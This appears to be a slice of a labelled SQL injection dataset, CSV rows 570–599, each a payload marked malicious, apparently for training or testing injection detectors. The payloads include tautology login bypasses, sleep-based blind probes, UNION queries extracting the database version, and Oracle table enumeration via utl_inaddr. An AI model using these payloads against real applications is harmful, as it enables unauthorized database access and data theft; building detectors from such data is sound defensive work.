row_index,payload_norm,label,sqli_type_hint
570,"admin"" or ""1"" = ""1""#",1,
571,"admin"" or 1 = 1--",1,
572,or user like '%,1,
573,admin' ) or '1' = '1,1,
574,""" or sleep ( __TIME__ ) #",1,
575,"select * from users where id = 1 or "" ) $"" or 1 = 1 -- 1",1,
576,"select * from users where id = 1 or ""?%"" or 1 = 1 -- 1",1,
577,select * from users where id = '1' + $+%$ or 1 = 1 -- 1',1,
578,or ''-',1,
579,"select * from users where id = '1' union select \.#,@@VERSION -- 1'",1,
580,admin' ) or '1' = '1'/*,1,
581,"AND 1 = utl_inaddr.get_host_address ( ( SELECT DISTINCT ( table_name ) FROM ( SELECT DISTINCT ( table_name ) , ROWNUM AS LIMIT FROM sys.all_tables ) WHERE LIMIT = 3 ) ) AND 'i' = 'i",1,
582,"select * from users where id = 1 or ""@?"" or 1 = 1 -- 1",1,
583,select * from users where id = 1 <@$ or 1 = 1 -- 1,1,
584,x' or 1 = 1 or 'x' = 'y,1,
585,"AND 1 = utl_inaddr.get_host_address ( ( SELECT DISTINCT ( table_name ) FROM ( SELECT DISTINCT ( table_name ) , ROWNUM AS LIMIT FROM sys.all_tables ) WHERE LIMIT = 8 ) ) AND 'i' = 'i",1,
586,"select * from users where id = 1 union select 1 $,version ( ) -- 1",1,
587,) or ( 'x' ) = ( 'x,1,
588,"select * from users where id = 1 or 1#"" ( union select version ( ) ,version ( ) -- 1",1,
589,"select * from users where id = 1.%@ union select 1,version ( ) -- 1",1,
590,"select * from users where id = 1 +$+ union select null,@@VERSION -- 1",1,
591,"select * from users where id = '1' union select \.,@@VERSION -- 1'",1,
592,"select * from users where id = 1 or 1#""@ union select null,version ( ) -- 1",1,
593,"select * from users where id = 1 +$+. union select null,@@VERSION -- 1",1,
594,"select * from users where id = 1 +1<@ union select null,version ( ) -- 1",1,
595,) ) or sleep ( __TIME__ ) = ',1,
596,having 1 = 1--,1,
597,select * from users where id = 1 or $ 1 = 1 or 1 = 1 -- 1,1,
598,"select * from users where id = '1' or @ 1 = 1 union select 1,version ( ) -- 1'",1,
599,"select * from users where id = 1 or 1#""; union select 1,version ( ) -- 1",1,
